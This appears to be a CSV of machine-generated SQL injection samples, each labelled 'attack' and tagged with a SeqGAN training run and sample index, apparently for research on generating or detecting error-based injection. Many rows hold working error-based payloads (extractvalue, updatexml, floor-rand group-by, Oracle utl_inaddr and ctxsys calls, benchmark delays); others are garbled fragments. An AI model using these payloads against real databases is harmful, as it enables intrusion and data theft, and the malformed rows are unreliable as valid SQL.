label,payload,family,payload_type,method,run_id,sample_index
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '""  =  ""' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'l""  =  ""q",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,10
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'eeypjyyoy'  =  'yy'  =  'ty'  =  'uz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,11
attack,"1""  )   or where 2017(  =  =  =  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,12
attack,-7810e  )   or by by 9067  =  0x7171706a711045  1045,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,13
attack,"-'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  '4822x""  =  ""uowy' like 'wz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,14
attack,-7864or 1  utlyv,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,15
attack,"1   )or 1 where 4386,6082  =    =  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,16
attack,-7810or 3440  )tl_inuadn1045uad,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,17
attack,1'||  (  select ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,18
attack,"1""   )    )    )    )l 9067and where ,=  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,19
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""tu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,20
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""tu'  =  ''  =  ''  =  '' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'u'  =  'xtwxyu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,21
attack,"-3775'',1392 1dhyuou",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,22
attack,1'  ))   or 1  =xoy,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,23
attack,"1"",p1045otxu' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'"" like ""'  =  'z",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,24
attack,1'  )   or or by 2131c   (  8877t.c,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,25
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""oymu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,26
attack,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ' fx%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,27
attack,"1""   ))   a m where where =  ctyx",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,28
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ')    )    )u   )zwhere 6825 by 6825 l",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,29
attack,"1'||  (  select 'eo' like 'y'  =  'j)ay'  =  's.rz"" like ""rs'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,30
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""yhe'  =  'zop' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'y' like '' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'nu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,31
attack,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'e",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,32
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,33
attack,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""'  =  'd'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,34
attack,1'  )' where =  cxyxptowcl,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,35
attack,1''+  (  select 'awa' like 'n' like ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,36
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'z'  =  'ev'  =  'yjl'  =  'zz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,37
attack,1  )   and 4386 6913  =  =  select 5978  =  ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,38
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ' linaddzr6082wherepdoww  a",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,39
attack,1' ohr.gewjwjrujywel,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,40
attack,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,41
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tutvlg",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,42
attack,-6236'   )   )     )   or by concat  (  7881(,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,43
attack,"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%""  =  """"  =  ""z",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,44
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'jew' like 'f",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,45
attack,-7562tu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,46
attack,1'select oow'  =  'xsu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,47
attack,"1%""  =  """"  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,48
attack,1  )   or 1  =  =concat4493  uselectxwhere l,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,49
attack,17864)j)   and 5305  (  c  =ctxi ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,50
attack,1'||  (  select ''xyx fbphmu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,51
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'a)wwzbf"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""ubz'  =  '"" like ""w.f",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,52
attack,"-50324838''   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'nu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,53
attack,-9740'  )   or by 1owzyyoyyt,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,54
attack,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '(wyuowyu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,55
attack,"""1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'yoywygrysslje",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,56
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'l_yy",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,57
attack,"1%""  =  ""n)a' like 'd",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,58
attack,1'     )    )    usnz'  =  'zobowow,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,59
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'swwxeul'  =  'z",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,60
attack,1   or 1  c=  (uttlu'  =  'er.,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,61
attack,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'oywejowowwowy' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,62
attack,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  '%wb)mjb'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,63
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'ul'  =  'ebwwozy'  =  'ewl",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,64
attack,"1'||  (  select 'yoywwy' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""l'  =  'zu'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,65
attack," or AND 1  =  =  6082 cast=)u,  =",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,66
attack,"1     ttutw' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'' like '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,67
attack,"1""   )    ))f)   or 1 6055  =  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,68
attack,1 where  =  c=txgynouayy'  =  ''  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,69
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""unawq' like ''  =  '' like ')lwwzyfromye",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,70
attack,-7319)     )uaa,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,71
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  '   )    )    )    as 9067 from =k  1045",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,72
attack,-''  )    )   )     )     awsyu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,73
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""'  un' like '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,74
attack, AND    =  u  tx.gywxxyow,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,75
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""adq' like '   add",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,76
attack,"1'  )   or 5023 ut"" like ""trolwww,",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,77
attack,1   )    s 9067 ryokadn,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,78
attack,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'xv)ewj  uu' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||''  =  'ztxq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,79
attack,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   't8844""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '""  =  ""v",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,80
attack,"1""3440xyyu'  =  'zi'  =  'e",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,81
attack,"1   )    )    and""  =  "" where concat  (  =  =tx",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,82
attack,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'u' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||''  =  '' like '' like 't"" like ""ad",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,83
attack,"1',txyo'  =  'u'  =  'z' like 'l'  =  'ejljbz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,84
attack, from7562owtoywxp,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,85
